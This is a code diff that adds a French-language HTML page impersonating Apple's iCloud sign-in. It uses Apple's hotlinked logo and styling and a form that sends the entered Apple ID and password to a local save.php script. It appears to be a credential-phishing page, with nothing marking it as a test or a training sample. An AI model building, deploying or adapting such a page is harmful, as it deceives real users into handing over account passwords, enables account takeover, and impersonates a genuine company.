@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Se connecter à iCloud</title>
+  <style>
+    body {
+      background-color: #f2f2f2;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .login-box {
+      background: white;
+      padding: 40px;
+      border-radius: 12px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      text-align: center;
+      width: 100%;
+      max-width: 400px;
+    }
+    .login-box img {
+      width: 80px;
+      margin-bottom: 20px;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+    }
+    button {
+      background-color: #007aff;
+      color: white;
+      padding: 12px;
+      border: none;
+      width: 100%;
+      border-radius: 8px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    button:hover {
+      background-color: #005bb5;
+    }
+    .info {
+      color: #666;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <img src="https://www.apple.com/ac/structured-data/images/open_graph_logo.png?202111180839" alt="iCloud">
+    <h2>Connexion iCloud</h2>
+    <form method="POST" action="save.php">
+      <input type="text" name="email" placeholder="Identifiant Apple" required>
+      <input type="password" name="password" placeholder="Mot de passe" required>
+      <button type="submit">Continuer</button>
+    </form>
+    <div class="info">
+      <p>Besoin d’aide ? <a href="#">Identifiant ou mot de passe oublié</a></p>
+    </div>
+  </div>
+</body>
+</html>
